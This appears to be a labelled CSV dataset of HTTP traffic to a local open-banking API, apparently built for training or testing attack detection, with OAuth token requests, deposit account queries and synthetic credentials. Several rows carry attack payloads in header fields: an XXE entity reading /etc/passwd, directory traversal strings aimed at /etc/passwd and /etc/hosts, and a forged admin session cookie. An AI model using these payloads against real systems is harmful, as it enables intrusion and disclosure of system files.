timestamp,attack.type,request.url,request.method,request.headers.authorization,request.headers.user-agent,request.headers.x-api-tran-id,request.headers.x-api-type,request.headers.x-csrf-token,request.headers.cookie,request.headers.set_cookie,request.headers.content-type,request.headers.content-length,request.body,response.headers.x-api-tran-id,response.headers.content-type,response.body,response.status
2025-03-19T08:35:37.758Z,,http://localhost:4000/api/v2/bank/accounts/deposit/detail,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjNmYThhNDYyLWIwMjItNGFlYy05YmQwLTMyYjk2OTZlNjYwYSIsImV4cCI6MTc0MjM3NjkzMywic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzMzM30.yCwF7fBv3onNVWF6FrGoCpvn-V6JDqyuiePZ82zOQ3E,Mozilla/5.0,bond123456STMTVJOZVXHLTUK,regular,,,,application/json;charset=UTF-8,99,"{""org_code"":""anya123456"",""account_num"":""7670814572"",""next"":""0"",""search_timestamp"":""20250319083537""}",bond123456STMTVJOZVXHLTUK,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""search_timestamp"":""20250319083537"",""detail_cnt"":1,""detailList"":[{""currency_code"":""KRW"",""balance_amt"":""347373.181"",""withdrawable_amt"":""344634.855"",""offered_rate"":""0.012"",""last_paid_in_cnt"":0}]}",200
2025-03-19T08:36:10.433Z,CookieInjection,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456SBEU6YNDXFRO7JG,,,,session=admin123; Path=/,application/x-www-form-urlencoded,633,"{""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083601_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""MTY4Mjkz"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDM="",""signed_person_info_req_len"":""16"",""signed_person_info_req"":""Q2luZHlSZW5uZXI="",""consent_nonce"":""L2025792574503262704"",""ucpid_nonce"":""A2025152627477967916"",""cert_tx_id"":""202503190836019d181e9b5da14433acda3eeb76"",""service_id"":""anya123456190320250001""}",bond123456SBEU6YNDXFRO7JG,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083601_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjU0Y2ViN2MwLTgzNWMtNGI5Ni05ZGU4LTZjY2ViYjVkMzJiYiIsImV4cCI6MTc0MjM3Njk3MCwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzM3MH0.nTycJZZc5hG-pQvN9jN4oMSLcdq8g7qSqsyrNDp54D0"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6ImJlYjk1ZDQ5LTQwNDctNGIwZS05MTFiLTFkMjBmNDNiZWRiYSIsImV4cCI6MTc0MjQ1OTc3MCwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzM3MH0.320TSGfy3BFLD7Tol8GdBdmcughEudjT1rw2uGftExI"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:36:12.646Z,DirectoryTraversal,http://localhost:4000/api/v2/bank/accounts/deposit/basic,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjU0Y2ViN2MwLTgzNWMtNGI5Ni05ZGU4LTZjY2ViYjVkMzJiYiIsImV4cCI6MTc0MjM3Njk3MCwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzM3MH0.nTycJZZc5hG-pQvN9jN4oMSLcdq8g7qSqsyrNDp54D0,Mozilla/5.0,../../../../etc/hosts,irregular,,,,application/json;charset=UTF-8,99,"{""org_code"":""anya123456"",""account_num"":""8318999005"",""next"":""0"",""search_timestamp"":""20250319083612""}",../../../../etc/hosts,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""search_timestamp"":""20250319083612"",""basic_cnt"":1,""basicList"":[{""currency_code"":""KRW"",""saving_method"":""METHOD_03"",""issue_date"":""2023-01-29T18:53:06.097Z"",""exp_date"":""2025-09-10T11:33:09.613Z"",""commit_amt"":""186299.639"",""monthly_paid_in_amt"":""3313.594""}]}",200
2025-03-19T08:36:32.143Z,XXE,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456SOFVPHHPBNUGM7I,,,,"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",application/x-www-form-urlencoded,635,"{""tx_id"":""MD_bond123456_anya123456_ra20250001_certauth00_20250319083623_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""NjIyNTY1"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDI="",""signed_person_info_req_len"":""16"",""signed_person_info_req"":""VGFsb25DcmlzdA=="",""consent_nonce"":""D2025424473841751939"",""ucpid_nonce"":""K2025457932157129648"",""cert_tx_id"":""202503190836231c151e925ac84accb6193e7c73"",""service_id"":""anya123456190320250001""}",bond123456SOFVPHHPBNUGM7I,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250001_certauth00_20250319083623_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6ImVjZDMwYjQ5LWFhMzgtNGQ1Mi1iMDg1LWJlMmFlMDA2MWIzNCIsImV4cCI6MTc0MjM3Njk5Miwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzM5Mn0.nrfQfuLAcxyGG3Iiz3wc1TFRT68XCPHiMtYT4fs7BVs"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjA4YTQ3MjM4LWQ0YzAtNGM0Yy1iNzI1LWNiYzNkNTJkMWE2YSIsImV4cCI6MTc0MjQ1OTc5Miwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzM5Mn0.kkwL4qJHYvBT6g5muEk4SSMxw-f4Cwa9KIwps7u9MLA"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:36:49.682Z,,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456S2HJ2V0WKZ7ENHJ,,,,,application/x-www-form-urlencoded,633,"{""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083640_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""MDY0NjMy"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDI="",""signed_person_info_req_len"":""16"",""signed_person_info_req"":""SmFycmV0SGF1Y2s="",""consent_nonce"":""J2025691002922210191"",""ucpid_nonce"":""N2025192294877908841"",""cert_tx_id"":""202503190836401a35d82a6e4b40e5baec8fa710"",""service_id"":""anya123456190320250001""}",bond123456S2HJ2V0WKZ7ENHJ,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083640_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjhiNjdhOGI1LTkwODQtNDkzMy1iYTkwLWVmOWI5MmFkNmQxMyIsImV4cCI6MTc0MjM3NzAwOSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQwOX0.YgoTZooEATh6QGEJyvscPSYcsIki3pTtUtv4XmGoh_E"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6ImRiNDBhN2U5LWE3YmQtNDFlMy1iZmJmLTg1OGNlOTM4OTIzNSIsImV4cCI6MTc0MjQ1OTgwOSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQwOX0.eZBF8c3TDIuNf2djZk3YbO8XD75xVA-xeK0XXwF-734"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:36:51.956Z,,http://localhost:4000/api/v2/bank/accounts/deposit/detail,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjhiNjdhOGI1LTkwODQtNDkzMy1iYTkwLWVmOWI5MmFkNmQxMyIsImV4cCI6MTc0MjM3NzAwOSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQwOX0.YgoTZooEATh6QGEJyvscPSYcsIki3pTtUtv4XmGoh_E,Mozilla/5.0,bond123456SGKM3GB7YU77BWH,irregular,,,,application/json;charset=UTF-8,99,"{""org_code"":""anya123456"",""account_num"":""0384271538"",""next"":""0"",""search_timestamp"":""20250319083651""}",bond123456SGKM3GB7YU77BWH,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""search_timestamp"":""20250319083651"",""detail_cnt"":1,""detailList"":[{""currency_code"":""USD"",""balance_amt"":""571621.027"",""withdrawable_amt"":""571562.216"",""offered_rate"":""0.016"",""last_paid_in_cnt"":3}]}",200
2025-03-19T08:37:11.529Z,XXE,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456SIQOXYPDISQ4YBX,,"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",,,application/x-www-form-urlencoded,639,"{""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083702_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""ODE5NjI2"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDM="",""signed_person_info_req_len"":""20"",""signed_person_info_req"":""RWxlY3RhRGVuZXNpaw=="",""consent_nonce"":""F2025897829813599840"",""ucpid_nonce"":""M2025962884364978805"",""cert_tx_id"":""20250319083702ba115624d76c4beea7075b5955"",""service_id"":""anya123456190320250001""}",bond123456SIQOXYPDISQ4YBX,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083702_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6Ijc3NjE0Yzg4LTU0NzMtNDlkZi05Y2I5LWNmNTE1YzA4OGY3OCIsImV4cCI6MTc0MjM3NzAzMSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQzMX0.iWcux4wOIG1C9oNCVyJTRGuTP0k1VWHWLVoqiPmbfog"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjdiNTIwNDE1LTk0MTItNGI2Mi05M2FkLTE5OTJhYTU0ZGZiYiIsImV4cCI6MTc0MjQ1OTgzMSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQzMX0.mgIZaaVPoi2ndcQPo10Ofw0r4Ec_gROqly-F0ERK8wc"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:37:26.795Z,,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456SR2BLREA95B4YMF,,,,,application/x-www-form-urlencoded,635,"{""tx_id"":""MD_bond123456_anya123456_ra20250001_certauth00_20250319083718_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""NjgxNzQw"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDI="",""signed_person_info_req_len"":""16"",""signed_person_info_req"":""QXRoZW5hS2lobg=="",""consent_nonce"":""N2025115463793192016"",""ucpid_nonce"":""E2025708881972057612"",""cert_tx_id"":""2025031908371871055cda85ea45d8be06bec0f6"",""service_id"":""anya123456190320250001""}",bond123456SR2BLREA95B4YMF,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250001_certauth00_20250319083718_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjM0MDcyNDNkLThhNTItNDQyNi1hYzA3LTg1ZWNlMzNmZmQyNCIsImV4cCI6MTc0MjM3NzA0Niwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ0Nn0.yQp11mMAzy3kys63QnQzXq4LfJkrpu6sbTAS55CKM2w"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjQ3OTBiYjlkLWUxOTUtNGM5MS04NTFmLTRlOWY0NDZmY2M1YyIsImV4cCI6MTc0MjQ1OTg0Niwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ0Nn0.BzeL_rpVgpy0ZgjKMEeLUbFW4Ik8YWRrZlFdpgjOYd8"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:37:46.623Z,,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456SYULGRFZRF8FFKG,,,,,application/x-www-form-urlencoded,637,"{""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083737_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""NTExNjY3"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDI="",""signed_person_info_req_len"":""20"",""signed_person_info_req"":""U2F2YW5uYUtvdmFjZWs="",""consent_nonce"":""Y2025740953223656195"",""ucpid_nonce"":""U2025394390455613198"",""cert_tx_id"":""2025031908373789eb57763a7e438aa6ec28c876"",""service_id"":""anya123456190320250001""}",bond123456SYULGRFZRF8FFKG,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250003_certauth00_20250319083737_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjVhYmI5NWQ4LTZlN2QtNDljZS1iNTJiLWE0ZTgyYzIxYjg4NCIsImV4cCI6MTc0MjM3NzA2Niwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ2Nn0.zHKFRbGtOgIp5bdiSa8J0s8vOB_BCsXpgyJUOrnFMoY"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjM5Y2YwOTA4LTFlZGMtNDE0ZS1hMTNjLTQxYTg4NmNkMGQ0NyIsImV4cCI6MTc0MjQ1OTg2Niwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ2Nn0.pVY2hilAyZYmizIhWySDP9Rx39MHsbPCVU-GfqrO3F4"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:38:01.873Z,,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,bond123456S8VDHGSYPM45WFJ,,,,,application/x-www-form-urlencoded,639,"{""tx_id"":""MD_bond123456_anya123456_ra20250002_certauth00_20250319083753_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""MzQ0ODY5"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDM="",""signed_person_info_req_len"":""20"",""signed_person_info_req"":""TWFnbm9saWFLdW56ZQ=="",""consent_nonce"":""D2025108834897056884"",""ucpid_nonce"":""M2025634728805577821"",""cert_tx_id"":""2025031908375306f72e3924fc49058b95c4c57c"",""service_id"":""anya123456190320250001""}",bond123456S8VDHGSYPM45WFJ,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250002_certauth00_20250319083753_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjY1NTA3YWE3LWE4NjAtNGRlMi1iMmVlLTJhODE0ZGMwODBjYSIsImV4cCI6MTc0MjM3NzA4MSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ4MX0.5X0nNj-t-LfppkNycNp1JDw6PebKNuxKIDyRvy-VMJM"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6ImFmNDIzNzlhLWJmYWEtNDE0NS05ZjUzLTcyZThkYWVmMmMzMiIsImV4cCI6MTc0MjQ1OTg4MSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ4MX0.3oDsTBL-DpM0oUkqE3jh8yjjzQ-UIZhHxyo8iCfUc28"",""refresh_token_expires_in"":86400}",200
2025-03-19T08:38:04.128Z,DirectoryTraversal,http://localhost:4000/api/v2/bank/accounts/deposit/detail,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjY1NTA3YWE3LWE4NjAtNGRlMi1iMmVlLTJhODE0ZGMwODBjYSIsImV4cCI6MTc0MjM3NzA4MSwic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzQ4MX0.5X0nNj-t-LfppkNycNp1JDw6PebKNuxKIDyRvy-VMJM,../../../etc/passwd,bond123456SO8AOW6UXAEIEBQ,regular,,,,application/json;charset=UTF-8,99,"{""org_code"":""anya123456"",""account_num"":""5263699880"",""next"":""0"",""search_timestamp"":""20250319083804""}",bond123456SO8AOW6UXAEIEBQ,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""search_timestamp"":""20250319083804"",""detail_cnt"":1,""detailList"":[{""currency_code"":""USD"",""balance_amt"":""25197.227"",""withdrawable_amt"":""22923.91"",""offered_rate"":""0.036"",""last_paid_in_cnt"":3}]}",200
2025-03-19T08:38:21.534Z,XXE,http://localhost:4000/api/oauth/2.0/token,POST,,Mozilla/5.0,"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",,,,,application/x-www-form-urlencoded,635,"{""tx_id"":""MD_bond123456_anya123456_ra20250002_certauth00_20250319083812_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""NDMyOTI3"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDE="",""signed_person_info_req_len"":""16"",""signed_person_info_req"":""TGlhQmVybmllcg=="",""consent_nonce"":""L2025312015268879476"",""ucpid_nonce"":""G2025399019913152151"",""cert_tx_id"":""2025031908381283350490c5ec4f6da93b86a93c"",""service_id"":""anya123456190320250001""}","<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",application/json;charset=UTF-8,"{""code"":""2000"",""message"":""Invalid parameters provided""}",400
2025-03-19T08:38:47.825Z,XXE,http://localhost:4000/api/oauth/2.0/token,POST,,"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",bond123456SPOVWFK7A0HTBMW,,,,,application/x-www-form-urlencoded,639,"{""tx_id"":""MD_bond123456_anya123456_ra20250002_certauth00_20250319083839_XXAB00490000"",""org_code"":""bond123456"",""grant_type"":""password"",""client_id"":""wcf8rjy6kphudsnea0l3ytkpdhqrvcxz1578m4q7xv9zb2tgca"",""client_secret"":""a0l3ytkpdhqrvcfz926btm4q7xv9zb2tgc8rjy6kphudsnew5o"",""ca_code"":""certauth00"",""username"":""MjQzNjc2"",""request_type"":""1"",""password_len"":""12"",""password"":""UEFTU1dPUkQ="",""auth_type"":""1"",""consent_type"":""1"",""consent_len"":""16"",""consent"":""Y29uc2VudC0wMDM="",""signed_person_info_req_len"":""20"",""signed_person_info_req"":""QXJvbkhldHRpbmdlcg=="",""consent_nonce"":""G2025257142757585185"",""ucpid_nonce"":""O2025601471538386343"",""cert_tx_id"":""2025031908383918150ddb4853488d9b5fa6247f"",""service_id"":""anya123456190320250001""}",bond123456SPOVWFK7A0HTBMW,application/json;charset=UTF-8,"{""rsp_code"":""0000"",""rsp_msg"":""Success"",""tx_id"":""MD_bond123456_anya123456_ra20250002_certauth00_20250319083839_XXAB00490000"",""token_type"":""Bearer"",""access_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6ImY5Y2E1ZGI5LTk1ZDItNGFhMi05NjczLTk2NTFiNTBjMzc5NiIsImV4cCI6MTc0MjM3NzEyNywic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzUyN30.LDtN4C0io6hl6Uqxk11gl9RwlbYSFbSx3fwnlHoVA0Y"",""expires_in"":3600,""refresh_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ3Y2Y4cmp5NmtwaHVkc25lYTBsM3l0a3BkaHFydmN4ejE1NzhtNHE3eHY5emIydGdjYSIsImp0aSI6IjQ1NDUyZDQzLTM5Y2EtNDVkZC1hNzdhLTg5YTljNWU4NzE2OSIsImV4cCI6MTc0MjQ1OTkyNywic2NvcGUiOiJpcCIsImlhdCI6MTc0MjM3MzUyN30.EZaKk6Z3rKesWm-wHTs3yhGAC2VWwjonlodM3pppIxE"",""refresh_token_expires_in"":86400}",200
